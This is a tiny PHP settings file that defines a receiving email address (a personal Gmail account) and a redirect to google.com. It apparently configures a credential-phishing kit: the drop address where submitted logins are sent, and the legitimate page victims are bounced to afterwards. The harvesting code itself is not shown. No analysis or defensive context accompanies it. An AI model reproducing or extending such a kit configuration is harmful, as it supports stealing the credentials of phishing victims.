<?php 
$Receive_email="mahletim7@gmail.com";
$redirect="https://www.google.com/";
?>